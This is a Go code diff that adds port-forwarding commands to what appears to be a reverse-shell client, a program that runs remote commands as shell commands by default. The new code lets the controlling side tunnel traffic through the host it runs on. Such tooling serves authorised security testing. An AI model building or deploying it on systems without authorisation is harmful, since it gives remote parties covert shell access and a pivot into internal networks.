@@ -453,6 +453,56 @@ func (rc *ReverseClient) processCommand(command string) (shouldContinue bool, er
 		return true, rc.handleDownloadCommand(command)
 	}
 
+	// Handle port forwarding commands
+	if strings.HasPrefix(command, protocol.CmdForwardStart+" ") {
+		return true, rc.handleForwardStartCommand(command)
+	}
+
+	if strings.HasPrefix(command, protocol.CmdForwardData+" ") {
+		return true, rc.handleForwardDataCommand(command)
+	}
+
+	if strings.HasPrefix(command, protocol.CmdForwardStop+" ") {
+		return true, rc.handleForwardStopCommand(command)
+	}
+
 	// Default: execute as shell command
 	return true, rc.handleShellCommand(command)
+}
+
+// handleForwardStartCommand handles FORWARD_START command
+func (rc *ReverseClient) handleForwardStartCommand(command string) error {
+	// Format: FORWARD_START <fwd_id> <target_addr>
+	parts := strings.Fields(command)
+	if len(parts) != 3 {
+		return fmt.Errorf("invalid FORWARD_START command format")
+	}
+	fwdID := parts[1]
+	targetAddr := parts[2]
+	return rc.forwardHandler.HandleForwardStart(fwdID, targetAddr)
+}
+
+// handleForwardDataCommand handles FORWARD_DATA command
+func (rc *ReverseClient) handleForwardDataCommand(command string) error {
+	// Format: FORWARD_DATA <fwd_id> <conn_id> <base64_data>
+	parts := strings.Fields(command)
+	if len(parts) != 4 {
+		return fmt.Errorf("invalid FORWARD_DATA command format")
+	}
+	fwdID := parts[1]
+	connID := parts[2]
+	encodedData := parts[3]
+	return rc.forwardHandler.HandleForwardData(fwdID, connID, encodedData)
+}
+
+// handleForwardStopCommand handles FORWARD_STOP command
+func (rc *ReverseClient) handleForwardStopCommand(command string) error {
+	// Format: FORWARD_STOP <fwd_id>
+	parts := strings.Fields(command)
+	if len(parts) != 2 {
+		return fmt.Errorf("invalid FORWARD_STOP command format")
+	}
+	fwdID := parts[1]
+	rc.forwardHandler.HandleForwardStop(fwdID)
+	return nil
 }
